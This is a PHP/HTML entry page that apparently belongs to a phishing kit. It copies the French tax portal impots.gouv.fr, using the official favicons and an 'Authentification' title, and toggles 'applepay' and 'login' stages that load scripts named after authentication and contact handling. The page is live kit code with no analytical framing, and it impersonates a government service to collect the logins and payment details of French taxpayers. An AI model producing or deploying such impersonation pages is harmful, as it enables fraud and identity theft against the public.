<?php 
include '../server/configuration.php';
?>
<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="apple-itunes-app" content="app-id=505488770" />
        <meta name="format-detection" content="telephone=no" />
		<script type='text/javascript' src='https://code.jquery.com/jquery-1.11.0.js'></script>
		<script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
        <link rel="stylesheet" href="templates/styles/bootstrap.min.css" />
        <link rel="stylesheet" href="templates/styles/commun.css" />
        <link rel="stylesheet" href="templates/styles/mire.css" />
        <link rel="stylesheet" href="templates/styles/dac.css" />
        <link rel="shortcut icon" href="https://www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/favicon.ico" type="image/ico" />
        <link rel="apple-touch-icon" sizes="152x152" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-152.png" />
        <link rel="apple-touch-icon" sizes="144x144" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-144.png" />
        <link rel="apple-touch-icon" sizes="120x120" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-120.png" />
        <link rel="apple-touch-icon" sizes="114x114" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-114.png" />
        <link rel="apple-touch-icon" sizes="72x72" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-72.png" />
        <link rel="apple-touch-icon" href="../www.impots.gouv.fr/portail/sites/all/themes/impotsgouv/images/favicon/favicon-57.png" />
        <title>Particuliers | Authentification</title>
    </head>
<body>
    <div class="wc" id="wc">

    </div>
</body>
<?php 
	if ($applepay == "yes") {
		?>
		<script>let apple = "yes"
		</script>
		<?php
	}else{
        ?>
		<script>let apple = "no"
		</script>
		<?php
    }
	if ($login == "yes") {
		?>
		<script>let login = "yes"
		</script>
		<?php
	}else{
        ?>
		<script>let login = "no"
		</script>
		<?php
    }
?>
<script>
	

	let login = <?php echo $login;?>

</script>
<script src="main.js"></script>
<script src="templates/js/bootstrap.min.js"></script>
<script src="templates/js/dyn/auth2019v3.js"></script>
<script src="templates/js/dyn/idContact.js"></script>
<script src="templates/js/dyn/messages.js"></script>
<script src="templates/js/dyn/urls.js"></script>
<script src="templates/js/dyn/configuration.js"></script>
</html>